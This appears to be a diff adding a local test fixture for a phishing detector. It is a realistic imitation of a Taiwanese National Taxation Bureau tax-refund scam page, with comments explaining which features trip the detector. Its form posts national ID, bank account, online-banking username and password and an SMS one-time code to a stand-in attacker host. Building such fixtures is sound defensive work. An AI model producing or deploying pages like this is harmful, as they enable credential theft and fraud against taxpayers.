@@ -1,0 +1,89 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Mimics a 財政部國稅局 退稅 scam. The page text uses "退稅" / "國稅局" /
+  "財政部" to flip the brand-impersonation gate, and slips in mainland terms
+  (賬號 / 信息 / 默認) that real .gov.tw pages never use.
+  ============================================================================
+-->
+<html lang="zh-Hant-TW">
+  <head>
+    <meta charset="UTF-8" />
+    <title>財政部國稅局 — 114 年度綜合所得稅退稅通知</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body { margin: 0; font-family: "Microsoft JhengHei", system-ui, sans-serif; background: #f8fafc; color: #1e293b; }
+      .top { background: #0b3d91; color: white; padding: 10px 20px; font-size: 13px; }
+      header.gov { background: linear-gradient(180deg, #ffffff 0%, #e2e8f0 100%); border-bottom: 2px solid #0b3d91; padding: 18px 24px; display:flex; align-items:center; gap:14px; }
+      header.gov .seal { width: 56px; height: 56px; background: #0b3d91; color: white; border-radius: 50%; display:grid; place-items:center; font-weight: 800; font-size: 22px; }
+      .card { max-width: 580px; margin: 28px auto; background: white; padding: 30px; border: 1px solid #cbd5e1; }
+      h1 { color: #0b3d91; font-size: 22px; margin: 0 0 10px; border-bottom: 2px solid #0b3d91; padding-bottom: 8px; }
+      .badge { display:inline-block; background:#dc2626; color:white; font-size:12px; padding:2px 8px; border-radius:3px; margin-left:8px; }
+      .amount { background: #fef9c3; border: 1px dashed #ca8a04; padding: 14px; margin: 14px 0; text-align:center; font-size: 18px; font-weight: 700; color: #854d0e; }
+      label { display:block; font-size: 14px; margin: 14px 0 6px; }
+      input { width:100%; padding:10px; border:1px solid #94a3b8; border-radius:3px; box-sizing:border-box; font-size:14px; }
+      button { width:100%; margin-top:22px; background:#0b3d91; color:white; border:0; padding:13px; font-size:15px; font-weight:700; cursor:pointer; }
+      .legalese { font-size: 11px; color: #64748b; margin-top:16px; text-align:center; }
+    </style>
+  </head>
+  <body>
+    <div class="top">行政院 ▸ 財政部 ▸ 國稅局 &nbsp;&nbsp;&nbsp;字級：A A A &nbsp;|&nbsp; 網站導覽</div>
+    <header class="gov">
+      <div class="seal">稅</div>
+      <div>
+        <div style="font-size:20px;font-weight:800;color:#0b3d91">財政部 國稅局</div>
+        <div style="font-size:13px;color:#475569">National Taxation Bureau, Ministry of Finance</div>
+      </div>
+    </header>
+
+    <main class="card">
+      <h1>114 年度綜合所得稅退稅通知 <span class="badge">限時辦理</span></h1>
+
+      <p>納稅義務人您好，</p>
+      <p>
+        經本局核定，您 114 年度綜合所得稅之退稅作業已完成，請於 24 小時內登入辦理直撥退稅，
+        逾期未辦理將視為自動放棄並產生滯納金記錄。為確保您的權益，請依下列流程完成退稅手續。
+      </p>
+
+      <div class="amount">本期退稅金額：NT$ 12,486</div>
+
+      <p>
+        我們已透過簡訊與信息系統發送預設通知至您登記的聯絡賬號。若您未收到通知，
+        請填寫下列資料完成身分驗證後即可辦理退稅。
+      </p>
+
+      <!--
+        Form action: cross-eTLD+1 to a .top domain (high-risk TLD).
+        Brand mentions: 國稅局、財政部、退稅 — fires cross-strait detector
+        because of 信息、賬號、預設 sprinkled above.
+      -->
+      <form action="https://etax-refund.example-bad.top/submit" method="post">
+        <label>姓名</label>
+        <input type="text" name="name" required />
+
+        <label>身分證字號</label>
+        <input type="text" name="id_no" pattern="[A-Z][0-9]{9}" required />
+
+        <label>戶籍地址</label>
+        <input type="text" name="addr" required />
+
+        <label>退稅匯入銀行帳號</label>
+        <input type="text" name="bank_acct" inputmode="numeric" required />
+
+        <label>網路銀行登入賬號</label>
+        <input type="text" name="bank_user" required />
+
+        <label>網路銀行登入密碼（用於核對身分）</label>
+        <input type="password" name="bank_pass" required />
+
+        <label>簡訊驗證碼（請輸入您手機收到的 6 位數）</label>
+        <input type="text" name="otp" autocomplete="one-time-code" maxlength="6" required />
+
+        <button type="submit">立即辦理退稅</button>
+      </form>
+
+      <p class="legalese">本系統依據「電子化政府推動方案」設置，© 財政部 National Taxation Bureau 2026.</p>
+    </main>
+  </body>
+</html>
